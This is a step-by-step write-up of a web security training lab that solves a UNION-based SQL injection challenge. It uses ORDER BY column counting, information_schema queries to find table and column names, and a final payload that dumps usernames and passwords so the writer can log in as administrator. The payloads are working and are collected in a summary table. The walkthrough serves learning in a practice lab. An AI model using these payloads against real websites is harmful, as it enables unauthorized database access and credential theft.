# 💉 Lab 5: Listing the Database Contents on Non-Oracle DB

## 🎯 Objective

This lab requires us to **dump credentials (like username & password)** and login as administrator.  
We don’t know the table or column names, so we must **discover them using SQL Injection techniques**.

---

## 🛠 Step-by-Step Guide

### 🔹 Step 1: Intercept a Request Using Burp Suite

1. Open the lab
2. Intercept a request using Burp Suite (e.g., category filter like `Lifestyle`)
3. Send the request to **Repeater**

Example:

GET /filter?category=Lifestyle HTTP/2



Inject SQL payloads inside the `category` parameter.

---

### 🔹 Step 2: Find the Number of Columns

Use this payload to find column count:

' ORDER BY 1--
' ORDER BY 2--



✅ We find there are **2 columns**.

---

### 🧠 What is `information_schema`?

> `information_schema` is a **special system database** present in most SQL engines like MySQL and PostgreSQL.

It stores **metadata about all other databases**, such as:
- Table names
- Column names
- Data types
- Relationships

It **does NOT store the actual data**, like user passwords — but helps us locate **where data is stored**.

---

### 🧪 Step 3: Find All Table Names

We use the following SQLi payload:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

### 🧪 Step 4: Find Column Names in That Table

Once we know the table name (e.g., `users_xalvwhn`), we use:
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xalvwhn'--
```

This prints all column names like:
`username, password, email, etc.`
We only need username and password.

### 🧪 Step 5: Dump Username & Password from Table
Now we can run:
`' UNION SELECT username, password FROM users_xalvwhn--`

💡 Replace column names based on what you found.

✅ The lab will print the username and password values.


## 🔐 Final Step: Login as Administrator

1. Copy the credentials of administrator

2. Go to the login page

3. Enter the credentials

4. 🎉 Lab solved!

## 🧠 Summary of SQLi Payloads Used

| Purpose               | SQL Injection Payload                                                                                 |
| --------------------- | ----------------------------------------------------------------------------------------------------- |
| Discover table names  | `' UNION SELECT table_name, NULL FROM information_schema.tables--`                                    |
| Discover column names | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xalvwhn'--` |
| Dump credentials      | `' UNION SELECT username, password FROM users_xalvwhn--`                                              |


## ✅ Lab Solved!

Once you extract the `administrator` login credentials and successfully log in — the lab is considered complete.

ㅤ🔐 Tip: Always URL-encode your payload if inserting into a parameter.
Use Burp Suite → Right click → Encode → URL → Send.









